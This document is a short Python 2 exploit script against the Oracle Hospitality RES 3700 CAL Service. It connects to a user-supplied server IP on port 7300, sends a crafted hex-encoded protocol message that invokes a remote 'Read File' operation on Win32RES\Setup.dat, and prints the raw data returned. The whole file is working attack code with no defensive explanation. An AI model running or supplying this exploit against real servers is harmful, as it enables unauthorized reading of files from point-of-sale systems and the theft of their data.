#Author: Walid Faour
#Date: Feb. 25, 2020
#Oracle Hospitality RES 3700 CAL Service Exploit

import socket
import binascii

print 
print 'Oracle Hospitality RES 3700 CAL Service Exploit'
print 'Using readRemoteWin32RESSetupFile method/operation...'
print 

TCP_IP = raw_input("Enter remote Oracle Server IP address: ")
TCP_PORT = 7300
BUFFER_SIZE = 5000

header1 = "0201"
type = "bc"
header2 = "00c0a801"
unknown1 = "03"
node = binascii.hexlify("TST192P01") + "00" #Do note change
node_padding = "0000000000000"
unknown2 = "2000000"
seq = "2e0404000032"
crc8_checksum = "c1"
command = "e9907c2802917c01ffffff00000000" #Read File
file_name = binascii.hexlify("Win32RES\Setup.dat") #Do not change
end = "00ffffffffff4006950000000000ffffffff58ff95004006950000000000e0fe9500400695004006950000000000000000000000000098e0090198e0090198e00901000000002000000030fe95000000000008029500b4e0090150ff95000400000006000000d8fe950070fe9500"
MESSAGE = header1 + type + header2 + unknown1 + node + node_padding + unknown2 + crc8_checksum + seq + node + command + file_name + end
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(binascii.unhexlify(MESSAGE))
data = s.recv(BUFFER_SIZE)
s.close()

print "Received RAW data:", data


